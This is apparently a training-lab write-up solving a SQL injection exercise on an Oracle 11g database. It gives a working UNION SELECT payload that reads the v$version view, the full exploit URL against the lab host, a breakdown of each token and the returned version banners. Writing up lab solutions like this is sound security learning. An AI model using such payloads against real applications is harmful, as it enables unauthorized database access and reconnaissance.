## Lab 03: UNION Injection — Database Version on Oracle

**Technique:** UNION SELECT
**Database:** Oracle 11g
**Status:** Solved
 
### Context
 
The category filter is vulnerable to UNION injection. Oracle databases expose version information through a special view called `v$version` which stores one row per installed component. The task is to extract that information by appending a second SELECT via UNION.
 
### Final Payload
 
```
' UNION SELECT BANNER, NULL FROM v$version--
```
 
**Full URL:**
```
https://0a7d00ac04636584800a173a00740040.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
 
### Payload Breakdown
 
| Token | Purpose |
|---|---|
| `'` | Closes the original string literal |
| `UNION SELECT` | Appends a second result set to the original query, the injected SELECT must have the same number of columns as the original |
| `BANNER` | The column in `v$version` that holds the version string for each database component |
| `NULL` | The original query returns two columns, the second injected column must exist to match the column count but no data is needed from it, NULL is used as a placeholder and avoids data type conflicts since it is compatible with any column type |
| `FROM v$version` | Oracle-specific system view holding version info for each installed component, this view does not exist in MySQL or PostgreSQL making it a reliable Oracle fingerprint |
| `--` | Comments out the rest of the original query |
 
### Response Received
 
```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```
 
Confirmed Oracle 11g. Lab solved.
 
---
